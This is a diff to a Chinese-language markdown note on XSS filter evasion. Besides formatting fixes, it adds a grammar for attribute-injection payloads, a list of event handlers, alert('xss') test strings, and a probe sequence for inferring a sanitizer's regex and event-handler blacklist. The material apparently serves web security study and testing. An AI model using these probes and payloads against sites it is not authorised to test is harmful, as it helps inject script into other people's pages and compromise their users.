@@ -68,9 +68,9 @@ html 的解析顺序为3个环节：HTML解码 -->URL解码 -->JS解码
 <A{filler}hReF{?filler}={?filler}{quote}{special}:{javascript}{quote}{?filler}{>,//,Space,Tab,LF}
 ```
 
-/**{tag}**/：html 标签名： a img script 等等
+**{tag}**：html 标签名： a img script 等等
 
-/**{filter}**/：空格，/ 等，可以是url 编码的字符
+**{filter}**：空格，/ 等，可以是url 编码的字符
 ```
 <tag xxx – 如果失败，{space}
 <tag%09xxx – 如果失败，[s] tab
@@ -80,7 +80,7 @@ html 的解析顺序为3个环节：HTML解码 -->URL解码 -->JS解码
 <tag%0dxxx>-如果失败， [snr+]+
 <tag/~/xxx – 如果失败， .*+
 ```
-/**event_handler**/ 可能是多个even 函数:
+**event_handler** 可能是多个even 函数:
 ```
 onclick
 onauxclick
@@ -100,7 +100,7 @@ onmouseout
 onmouseover
 onmouseup
 ```
-/**{javascript}**/: js代码
+**{javascript}**: js代码
 js 代码可以混淆，可以js编码成unicode，可以使用html实体编码，几乎没法正则表达式绕过
 
 
@@ -111,12 +111,33 @@ js 代码可以混淆，可以js编码成unicode，可以使用html实体编码�
 ```
 
 ## html 编码绕过
-html 一般会过滤掉< > " $, 所以输出在html 内容位置的xss 泄露可以完全避免，但是输出在html 属性的payload 可能会漏放
+html 一般会过滤掉< > " &, 所以输出在html 内容位置的xss 泄露可以完全避免，但是输出在html 属性的payload 可能会漏放
 一般payload 以下格式
 ```
 {quote}{filler}{event_handler}{?filler}={?filler}{javascript}
 ```
 举例：
 ```
-"a onclick="alert('xss')"
+" onclick="alert('xss')"
+```
+## payload 构造试探
+```
+// 判断是否存在htmlspecialchars
+<script>alert("1")</script>
+
+// 判断是否filter格式
+<tag xxx – 如果失败，{space}
+<tag%09xxx – 如果失败，[s]
+<tag%09%09xxx -如果失败， s+
+<tag/xxx – 如果失败，[s/]+
+<tag%0axxx-如果失败， [sn]+
+<tag%0dxxx>-如果失败， [snr+]+
+<tag/~/xxx – 如果失败， .*+
+
+//判断event_handler是否黑名单格式
+<tag{filler}onxxx – 如果失败，onw+.
+如果通过， on(load|click|error|show)
+<tag{filler}onclick – 如果通过，则没有事件处理程序检查正则表达式。
+
+//构造js payload
 ```
